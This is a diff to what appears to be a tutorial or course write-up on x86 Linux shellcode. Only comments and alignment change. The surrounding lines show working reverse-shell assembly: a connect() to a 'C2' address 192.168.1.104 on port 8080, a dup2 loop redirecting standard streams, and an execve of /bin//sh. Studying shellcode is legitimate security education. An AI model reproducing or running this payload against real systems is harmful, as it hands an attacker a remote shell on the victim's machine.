@@ -194,7 +194,7 @@ cdq                    ; Clearing out EDX
 push edx               ; push for NULL termination
 push dword 0x68732f2f  ; push //sh
 push dword 0x6e69622f  ; push /bin
-mov ebx, esp           ; store address of TOS - /bin//sh
+mov ebx, esp           ; store address of TOS - /bin//sh in EBX
 mov al, 0x0b           ; store Syscall number for execve() = 11 OR 0x0b in AL
 int 0x80               ; Execute the system call
 ```
@@ -248,23 +248,22 @@ _start:
 	mov ebx, eax
 
 	; Loading the C2 IP address in stack - sockaddr_in struct - 3rd argument
-	push dword C2_IP      ; 0x6801a8c0 - C2 IP: 192.168.1.104 - reverse - hex
+	push dword C2_IP       ; 0x6801a8c0 - C2 IP: 192.168.1.104 - reverse - hex
 
 	; Loading the C2 Port in stack - sockaddr_in struct - 2nd argument
-	push word C2_PORT     ; 0x901f - C2 Port: 8080
+	push word C2_PORT      ; 0x901f - C2 Port: 8080
 
 	; Loading AF_INET OR 2 in stack - sockaddr_in struct - 1st argument
 	push word 0x02
 
 	; connect() Syscall
-	mov ax, 0x16a         ; Syscall for connect() = 362 OR 0x16a, loading it in AX
-	mov ecx, esp          ; Moving sockaddr_in struct from TOS to ECX
-	mov dl, 16            ; socklen_t addrlen = 16
-	int 0x80              ; Execute the connect syscall
+	mov ax, 0x16a          ; Syscall for connect() = 362 OR 0x16a, loading it in AX
+	mov ecx, esp           ; Moving sockaddr_in struct from TOS to ECX
+	mov dl, 16             ; socklen_t addrlen = 16
+	int 0x80               ; Execute the connect syscall
   	
-	xor ecx, ecx ; Clearing out ECX for 3rd Syscall - dup2()
-
-	mov cl, 0x3 ; Initializing a counter variable = 3 for loop
+	xor ecx, ecx           ; Clearing out ECX for 3rd Syscall - dup2()
+	mov cl, 0x3            ; Initializing a counter variable = 3 for loop
 
 	; dup2() Syscall in loop
 	loop_dup2:
